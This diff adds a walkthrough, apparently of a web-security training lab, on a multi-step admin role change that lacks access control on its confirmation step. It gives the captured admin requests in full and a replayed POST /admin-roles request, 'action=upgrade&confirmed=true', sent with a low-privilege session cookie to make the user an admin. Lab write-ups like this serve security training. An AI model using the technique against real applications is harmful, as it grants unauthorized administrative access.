@@ -1,0 +1,56 @@
+Multi-step process with no access control on one step 
+
+As administrator, promote carlos to admin and check the request in burp. You'll see two requests:
+
+POST /admin-roles HTTP/1.1
+Host: acdb1f0a1f6c278380c8152f0019009a.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 30
+Origin: https://acdb1f0a1f6c278380c8152f0019009a.web-security-academy.net
+Connection: close
+Referer: https://acdb1f0a1f6c278380c8152f0019009a.web-security-academy.net/admin
+Cookie: session=B2DsvKVCcSn2zU8e78WlZLHvw19lF2jA
+Upgrade-Insecure-Requests: 1
+
+username=carlos&action=upgrade
+
+and
+
+POST /admin-roles HTTP/1.1
+Host: acdb1f0a1f6c278380c8152f0019009a.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 45
+Origin: https://acdb1f0a1f6c278380c8152f0019009a.web-security-academy.net
+Connection: close
+Referer: https://acdb1f0a1f6c278380c8152f0019009a.web-security-academy.net/admin-roles
+Cookie: session=B2DsvKVCcSn2zU8e78WlZLHvw19lF2jA
+Upgrade-Insecure-Requests: 1
+
+action=upgrade&confirmed=true&username=carlos
+
+Is is the second one we're interested in. Send it to repeater. Log in as wiener, copy your session cookie and add it to the request. Send it and you should get the lab completed prompt.
+
+Request:
+POST /admin-roles HTTP/1.1
+Host: acdb1f0a1f6c278380c8152f0019009a.web-security-academy.net
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko/20100101 Firefox/76.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 45
+Origin: https://acdb1f0a1f6c278380c8152f0019009a.web-security-academy.net
+Connection: close
+Referer: https://acdb1f0a1f6c278380c8152f0019009a.web-security-academy.net/admin-roles
+Cookie: session=3QAfjA8b31ibkeLA1pVI38cFqHfxSWA8
+Upgrade-Insecure-Requests: 1
+
+action=upgrade&confirmed=true&username=wiener
